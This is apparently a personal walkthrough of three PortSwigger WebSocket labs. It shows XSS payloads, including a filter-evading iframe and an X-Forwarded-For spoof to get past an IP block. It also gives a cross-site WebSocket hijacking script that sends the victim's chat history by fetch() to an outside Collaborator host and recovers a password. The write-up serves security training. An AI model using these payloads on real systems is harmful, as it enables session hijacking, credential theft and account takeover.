# Portswigger
## WebSockets
### Manipulating WebSocket messages to exploit vulnerabilities
```bash

# This online shop has a live chat feature implemented using WebSockets.

# Chat messages that you submit are viewed by a support agent in real time.

# To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 

Go to: "Live chat"
Send content:

<img src=1 onerror='alert(1)'>

Note the WebSickets history:

{"message":"&lt;img src=1 onerror=&#39;alert(1)&#39;&gt;"}

Intercept is on:
Change the URL-encoded message:

{"user":"You","content":"<img src=1 onerror='alert(1)'>"}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529190422.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529190627.png)

### Manipulating the WebSocket handshake to exploit vulnerabilities
```bash

# This online shop has a live chat feature implemented using WebSockets.

# It has an aggressive but flawed XSS filter.

# To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. 

Go to: "Live chat"
Send message:

hey there!

send message:

<img src=1 onerror='1'>

Note the session terminates and you cannot go back to the previous session (apparently this is supposed to happen immediately, yet this was not the case for me as it happened after multiple chat terminations)
Send the 'hey there!' WebSockets history request to repeater
Go to: pencil icon
Source: Proxy
Click reconnect on any request w/ source as "proxy"
Insert into the request:

X-Forwarded-For: 1.3.4.5

Connect
You should be prompted with a response in the WebSockets history
Change the message

Insert:

<iframe src='jaVaScRiPt:alert`1`'></iframe>

Like so:

{"message":"<iframe src='jaVaScRiPt:alert`1`'></iframe>"}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529202458.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529200830.png)

### Cross-site WebSocket hijacking
```bash

# This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets).

# To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

Go to: "Live chat"
Message:

"hey"

Refresh page

Go to: 

GET /chat HTTP/1.1

Copy URL
Go to Burp -> Burp Collaborator client -> Copy to clipboard
Go to: "Go to exploit server"
Body:

<script>
    var ws = new WebSocket('wss://ac251fde1f0701dfc067179b00790020.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://424gaodtzbp03su14y0de4y7uy0ood.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

View exploit
Go to: Burp Collaborator client -> Poll now
Once verified that the responses are being received:

Deliver exploit to victim
Go to: Burp Collaborator client -> Poll now
Go to:
Type: HTTP
Request to Collaborator

{"user":"You","content":"I forgot my password"}

{"user":"Hal Pline","content":"No problem carlos, it&apos;s zldkzccg4yvolbdftqa7"}

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529204148.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220529205840.png)

#hacking
